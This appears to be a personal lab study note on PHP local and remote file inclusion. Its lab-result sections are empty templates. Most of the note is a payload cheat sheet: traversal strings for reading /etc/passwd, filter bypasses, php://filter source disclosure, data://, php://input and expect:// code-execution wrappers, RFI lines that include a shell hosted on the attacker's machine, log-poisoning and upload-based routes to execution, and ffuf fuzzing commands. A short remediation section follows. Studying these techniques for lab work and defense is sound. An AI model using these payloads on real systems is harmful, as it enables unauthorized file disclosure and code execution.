# File Inclusion

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Abuse a parameter that includes a file (`?page=`, `?lang=`) to read local files (**LFI**), disclose source, or get code execution. Remote inclusion (**RFI**) pulls a file from your server when `allow_url_include` is on.

## Basic LFI & path traversal
```text
http://t/?lang=/etc/passwd                       # direct include
http://t/?lang=../../../../etc/passwd            # escape the intended dir
http://t/?lang=....//....//etc/passwd            # if ../ is filtered non-recursively
```
Windows targets: `..\..\..\windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`.

## Bypasses
- **Non-recursive `../` filter:** `....//`, `..././`, `....\/` (the filter strips one `../`, leaving a valid one).
- **Encoding:** URL-encode `%2e%2e%2f`, double-encode `%252e%252e%252f`, overlong UTF-8.
- **Approved-path filter** (must start with `./languages/`): prepend it then traverse: `./languages/../../../etc/passwd`.
- **Appended extension** (code adds `.php`): use a PHP wrapper (below); on *old* PHP, null byte `%00` or path truncation (both obsolete on modern PHP).

## PHP wrappers (LFI → source disclosure / RCE)
```text
# read PHP SOURCE (normally it'd execute) — base64 so it survives transit:
?lang=php://filter/convert.base64-encode/resource=config.php   → base64 -d to read
# data/input wrappers for RCE (if allow_url_include):
?lang=data://text/plain;base64,<base64-of-php>
?lang=php://input   (POST the PHP in the body)
# expect:// for direct command exec (if the extension is loaded)
```

## PHP wrappers for RCE — requirements & detail
Before trying `data://`/`input://`, confirm the config via the base64 filter:
```text
?lang=php://filter/convert.base64-encode/resource=/etc/php/<ver>/apache2/php.ini
# decode, then: grep -i "allow_url_include\|expect"
```
- **`data://`** and **`input://`** need **`allow_url_include = On`**. data:// carries base64-encoded PHP inline (`data://text/plain;base64,<your-b64-php>` — encode your own payload, not stored here); input:// takes the PHP in the POST body with the command as a GET param (`curl -s "http://t/?lang=php://input&cmd=id" --data "<php>"`).
- **`expect://`** needs the **expect extension** loaded → direct command exec: `?lang=expect://id`.
- **`phar://` / `zip://`** — when you can upload a file: pack PHP into a phar/zip, then LFI into it for execution (classic "upload a .jpg, LFI the phar inside").

> Check the config first (which wrappers are even possible), then: `expect://` is the simplest if present; else `data://`/`input://` need `allow_url_include`; else fall back to log poisoning. Each needs a specific setting enabled, so enumerate php.ini via the base64 filter before burning time.

## RFI (Remote File Inclusion)
If the include allows a remote URL (`allow_url_include = On`), host your payload and include it → RCE. RFI implies LFI, not vice versa; also enables SSRF.
```text
?lang=http://<me>/shell.php          # HTTP (python3 -m http.server)
?lang=ftp://<me>/shell.php           # FTP (pyftpdlib) — WAF bypass
?lang=\\<me>\share\shell.php         # SMB UNC (impacket smbserver) — Windows, internal
```
Test first with `?lang=http://127.0.0.1/` to confirm remote fetch works.

## LFI → RCE paths
- **PHP filter source disclosure** → read config/source → find creds or the next bug.
- **Upload + LFI** (when upload exists but doesn't execute): embed PHP in a file the server stores, then LFI it:
  - **Image**: valid magic bytes (`GIF89a;`) + PHP appended, upload as `.gif`, LFI the path.
  - **zip://**: upload a zip containing a PHP shell → `?lang=zip://uploaded.zip%23shell.php` (needs zip ext).
  - **phar://**: pack PHP in a phar → `?lang=phar://uploaded.phar/shell` (needs phar ext).
- **Log poisoning** (need read access to the log):
  - **Server logs**: poison `User-Agent` (or any logged header) with PHP → LFI `access.log` (Apache `/var/log/apache2/access.log`, Nginx) → executes. (Webshell not stored here.)
  - **PHP session**: put PHP in a controllable session var → LFI the session file (`/var/lib/php/sessions/sess_<PHPSESSID>`).
  - Others: `/proc/self/environ`, `/proc/self/fd/N`, mail logs, vsftpd/sshd logs.

> RFI is instant RCE when `allow_url_include` is on (test `http://127.0.0.1` first). When it's off: PHP filter to read source → upload+LFI or log poisoning to execute. Match the technique to which PHP extensions/settings are enabled (check php.ini via the base64 filter).

## Find include params & files
```bash
ffuf -w params.txt -u "http://t/?FUZZ=/etc/passwd"      # discover the vulnerable param
ffuf -w files.txt  -u "http://t/?lang=FUZZ"             # fuzz include targets
```

## Fix
Whitelist allowed files (not user input → path), disable `allow_url_include`/`allow_url_fopen`, sanitize `../`, least-privilege file perms, store sensitive files outside webroot.

> LFI ladder: read `/etc/passwd` to confirm → `php://filter` to pull source/creds → escalate to RCE via log poisoning or a data/input wrapper. The base64 filter is the key trick — it lets you read PHP that would otherwise just execute.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
